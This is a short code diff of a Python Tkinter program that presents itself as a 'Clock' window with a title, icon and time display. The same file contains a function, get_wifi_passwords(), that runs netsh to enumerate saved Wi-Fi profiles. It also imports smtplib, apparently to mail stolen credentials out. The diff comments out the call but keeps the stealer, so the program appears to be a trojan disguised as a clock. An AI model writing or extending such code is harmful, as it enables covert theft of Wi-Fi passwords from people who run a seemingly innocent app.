@@ -1,6 +1,7 @@
 import subprocess, re, smtplib
 from tkinter import *
 from time import *
+from PIL import ImageTk, Image
 
 def get_wifi_passwords():
     command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode()
@@ -67,9 +68,14 @@ def main():
 
         window.after(1000, update)
 
-    get_wifi_passwords()
+    # get_wifi_passwords()
 
     window = Tk()
+    window.resizable(0,0)
+    window.title('Clock')
+    with Image.open('icon.ico') as image:
+        icon = ImageTk.PhotoImage(image)
+    window.iconphoto(True, icon)
 
     time_label = Label(window, font= ('Arial', 50), fg= '#00ff00', bg= 'black')
     time_label.pack()
